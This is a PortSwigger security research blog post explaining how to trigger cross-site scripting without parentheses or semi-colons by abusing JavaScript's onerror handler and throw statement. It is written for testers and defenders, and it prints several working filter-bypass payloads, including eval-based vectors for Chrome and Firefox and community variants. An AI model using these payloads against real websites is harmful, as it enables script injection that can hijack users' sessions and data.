---
source: portswigger-research
source_url: https://portswigger.net/research/xss-without-parentheses-and-semi-colons
title: "XSS without parentheses and semi-colons | PortSwigger Research"
published: 2019-05-15T14:54:03
description: "A few years ago I discovered a technique to call functions in JavaScript without parentheses using onerror and the throw statement. It works by setting the onerror handler to the function you want to"
---

# XSS without parentheses and semi-colons

![Gareth Heyes](https://portswigger.net/content/images/profiles/callout_gareth_heyes_114px.png)

### [Gareth Heyes](https://portswigger.net/research/gareth-heyes)

Researcher

[@garethheyes](https://twitter.com/garethheyes)

- **Published:** Wednesday, 15 May 2019 at 14:54 UTC

- **Updated:** Friday, 20 March 2020 at 07:50 UTC


![XSS without parentheses](https://portswigger.net/cms/images/72/4a/b1def7274037-article-xss_without_parentheses-article.jpg)

A few years ago I discovered a technique to [call functions in JavaScript without parentheses](http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/) using `onerror` and the `throw` statement. It works by setting the `onerror` handler to the function you want to call and the `throw` statement is used to pass the argument to the function:

`<script>onerror=alert;throw 1337</script>`

The `onerror` handler is called every time a JavaScript exception is created, and the `throw` statement allows you to create a custom exception containing an expression which is sent to the `onerror` handler. Because `throw` is a statement, you usually need to follow the `onerror` assignment with a semi-colon in order to begin a new statement and not form an expression.

I encountered a site that was filtering parentheses and semi-colons, and I thought it must be possible to adapt this technique to execute a function without a semi-colon. The first way is pretty straightforward: you can use curly braces to form a block statement in which you have your `onerror` assignment. After the block statement you can use `throw` without a semi-colon (or new line):

`<script>{onerror=alert}throw 1337</script>`

The block statement was good but I wanted a cooler alternative. Interestingly, because the `throw` statement accepts an expression, you can do the `onerror` assignment inside the `throw` statement and because the last part of the expression is sent to the `onerror` handler the function will be called with the chosen arguments. Here's how it works:

![Example of using the throw statement with an expression](https://portswigger.net/cms/images/07/f8/03b498b7f41b-article-onerror.png)

`<script>throw onerror=alert,'some string',123,'haha'</script>`

If you've tried running the code you'll notice that Chrome prefixes the string sent to the exception handler with "Uncaught".

![Alert box showing Uncaught in Chrome](https://portswigger.net/cms/images/26/b9/2e3196af1042-article-uncaught-alert.png)

In my previous blog post I showed how it was possible to use eval as the exception handler and evaluate strings. To recap you can prefix your string with an = which then makes the 'Uncaught' string a variable and executes arbitrary JavaScript. For example:

`<script>{onerror=eval}throw'=alert\x281337\x29'</script>`

The string sent to `eval` is "`Uncaught=alert(1337)`". This works fine on Chrome but on Firefox the exception gets prefixed with a two word string "uncaught exception" which of course causes a syntax error when evaluated. I started to look for ways around this.

It's worth noting that the `onerror/throw` trick won't work when executing a `throw` from the console. This is because when the `throw` statement is executed in the console the result is sent to the console and not the exception handler.

When you use the `Error` function in Firefox to create an exception it does not contain the "uncaught exception" prefix. But instead, just the string "Error":

`throw new Error("My message")//Error: My message`

I obviously couldn't call the `Error` function because it requires parentheses but I thought maybe if I use an object literal with the Error prototype that would emulate the behaviour. This didn't work - Firefox still prefixed it with the same string. I then used the [Hackability Inspector](http://portswigger-labs.net/hackability/inspector/?input=new%20Error(%27blah%27)) to inspect the Error object to see what properties it had. I added all the properties to the object literal and it worked! One by one I removed a property to find the minimal set of properties required:

`<script>{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'}</script>`

You can use the fileName property to send a second argument on Firefox too:

`<script>{onerror=prompt}throw{lineNumber:1,columnNumber:1,fileName:'second argument',message:'first argument'}</script>`

After I posted this stuff on Twitter [@terjanq](https://twitter.com/terjanq) and [@cgvwzq](https://twitter.com/cgvwzq) (Pepe Vila) followed up with some cool vectors. Here @terjanq removes all string literals:

`<script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>`

Pepe removed the need of the throw statement completely by using type errors to send a string to the exception handler.

`<script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>`

Visit our Web Security Academy to [learn more about cross-site scripting (XSS)](https://portswigger.net/web-security/cross-site-scripting)

[JavaScript](https://portswigger.net/research/javascript) [no-parentheses](https://portswigger.net/research/no-parentheses) [XSS](https://portswigger.net/research/cross-site-scripting-research)

[Back to all articles](https://portswigger.net/research/articles)

## Related Research

[**Cookie Chaos: How to bypass \_\_Host and \_\_Secure cookie prefixes** 03 September 2025Cookie Chaos: How to bypass \_\_Host and \_\_Secure cookie prefixes](https://portswigger.net/research/cookie-chaos-how-to-bypass-host-and-secure-cookie-prefixes) [**Stealing HttpOnly cookies with the cookie sandwich technique** 22 January 2025Stealing HttpOnly cookies with the cookie sandwich technique](https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique) [**Bypassing WAFs with the phantom $Version cookie** 04 December 2024Bypassing WAFs with the phantom $Version cookie](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie) [**Concealing payloads in URL credentials** 23 October 2024Concealing payloads in URL credentials](https://portswigger.net/research/concealing-payloads-in-url-credentials)